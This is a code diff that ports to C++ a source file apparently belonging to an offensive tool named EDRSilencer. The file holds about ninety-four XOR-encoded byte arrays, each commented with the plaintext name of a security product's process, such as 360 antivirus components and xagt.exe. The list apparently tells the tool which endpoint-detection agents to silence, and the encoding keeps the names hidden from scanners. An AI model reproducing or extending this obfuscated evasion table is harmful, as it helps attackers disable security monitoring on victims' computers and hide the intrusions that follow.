@@ -1,5 +1,6 @@
-#include "process.h"
-// --- Auto-generated Encrypted Process Names ---
+#include "process.hpp"
+// --- Auto-generated Encrypted Process Names (C++) ---
+namespace EDRSilencer {
 const unsigned char data_0[] = { 0x71, 0x74, 0x72, 0x23, 0x2b, 0x2c, 0x6c, 0x27, 0x3a, 0x27 }; // 360ain.exe
 const unsigned char data_1[] = { 0x71, 0x74, 0x72, 0x26, 0x37, 0x2f, 0x32, 0x6c, 0x27, 0x3a, 0x27 }; // 360dump.exe
 const unsigned char data_2[] = { 0x71, 0x74, 0x72, 0x2b, 0x2c, 0x31, 0x36, 0x2a, 0x27, 0x2e, 0x32, 0x27, 0x30, 0x6c, 0x27, 0x3a, 0x27 }; // 360insthelper.exe
@@ -96,7 +97,7 @@ const unsigned char data_92[] = { 0x2a, 0x35, 0x31, 0x26, 0x6c, 0x27, 0x3a, 0x27
 const unsigned char data_93[] = { 0x3a, 0x23, 0x25, 0x36, 0x6c, 0x27, 0x3a, 0x27 }; // xagt.exe
 
 // The array of structs pointing to the encrypted data.
-struct EncryptedString processData[] = {
+EncryptedString processData[] = {
     { data_0, sizeof(data_0) },   // 360ain.exe
     { data_1, sizeof(data_1) },   // 360dump.exe
     { data_2, sizeof(data_2) },   // 360insthelper.exe
@@ -195,3 +196,4 @@ struct EncryptedString processData[] = {
 
 const size_t PROCESS_DATA_COUNT = sizeof(processData) / sizeof(processData[0]);
 
+} // namespace EDRSilencer
